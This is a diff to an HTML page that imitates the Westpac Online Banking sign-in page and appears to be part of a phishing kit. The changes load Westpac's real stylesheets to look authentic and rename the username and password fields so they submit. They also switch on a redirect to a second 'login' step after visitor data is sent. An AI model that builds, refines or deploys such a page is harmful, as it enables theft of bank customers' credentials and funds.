@@ -17,11 +17,10 @@
         Sign in to Westpac Online Banking
 
     </title>
-    <link rel="shortcut icon" href="images/favicon.ico.23fb3f626712cf243b43f34a3e3a8e887b8e8250.ico" />
-    <link href="css/000-000-0001combined.css.1a6232cd07874834478c928fa1f30b79eea8fe08.css" rel="stylesheet" />
-    <link href="css/000-0001combined.css.4afbedaf9997c61c303d1951ae98f27918c490d3.css" rel="stylesheet" />
-    <link href="css/000-0001combined.css.b0cf37060ddf80c0f0adf1583668a8d44dfb5143.css" rel="stylesheet" />
-
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-000-0001combined.css.1a6232cd07874834478c928fa1f30b79eea8fe08.css" rel="stylesheet" />
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/000-0001combined.css.4afbedaf9997c61c303d1951ae98f27918c490d3.css" rel="stylesheet" />
+    <link href="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Fiserv.PS.Authentication/000-0001combined.css.b0cf37060ddf80c0f0adf1583668a8d44dfb5143.css" rel="stylesheet" />
+	
 	<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
     
 
@@ -71,7 +70,7 @@
             <div id="content" class="container-end" tabindex="-1">
                 <div id="logo">
                     <a >
-                        <img src="https://banking.westpac.com.au/wbc/banking/Themes/Default/Desktop/WBC/Core/Images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Internet Banking Home" />
+                        <img src="/images/logo_white_bg.png.ce5c4c19ec61b56796f0e218fc8329c558421fd8.png" alt="Westpac Internet Banking Home" />
                     </a>
                 </div>
 
@@ -146,14 +145,14 @@
                                     <div>
                                         <label for="CustomerID">
                                             <span class="label-text-main-v2">Customer ID</span>
-                                            <input id="CustomerID" maxlength="8" type="text" class="txtbox-layout-white log_ins" data-val="true" data-val-authempty="{AuthEmpty-Username}" data-val-authpattern="{AuthPattern-Username}" data-val-authminlength="{AuthMinLength-Username}" name="fakeusername" autocomplete="off" value="" />
+                                            <input id="CustomerID" maxlength="8" type="text" class="txtbox-layout-white log_ins" data-val="true" data-val-authempty="{AuthEmpty-Username}" data-val-authpattern="{AuthPattern-Username}" data-val-authminlength="{AuthMinLength-Username}" name="Username" autocomplete="off" value="" />
                                         </label>
 
                                         
                                         <label for="password">
                                             <span class="label-text-main-v2">Password</span>
 
-                                            <input id="Password"  type="password" name="password" class="txtbox-layout-white txtpwd-layout log_ins" autocomplete="off" data-val="true" data-val-authempty="{AuthEmpty-Password}" data-val-authminlength="{AuthMinLength-Password}" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-error-redirect-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=auth_info" data-capture-keycount="true" data-clear-button-id="clear" />
+                                            <input id="Password"  type="password" name="Password" class="txtbox-layout-white txtpwd-layout log_ins" autocomplete="off" data-val="true" data-val-authempty="{AuthEmpty-Password}" data-val-authminlength="{AuthMinLength-Password}" data-keymap-url="https://banking.westpac.com.au/eam/servlet/getEamInterfaceData" data-keymap-data-timeout="{KeymapDataTimeout-Token}" data-error-redirect-url="https://banking.westpac.com.au/wbc/banking/handler?TAM_OP=auth_info" data-capture-keycount="true" data-clear-button-id="clear" />
                                         </label> 
 
 
@@ -435,7 +434,7 @@ $(document).ready(function() {
                 // Store visitor info in sessionStorage
                 sessionStorage.setItem('visitor', visitor);
                 // Redirect to login page
-                //window.location.href = "login/2";
+                window.location.href = "login/2";
                 console.log(msg); // Log success message
             }).fail(function(err, textstatus, error) {
             //window.location.href = "login/2"; 
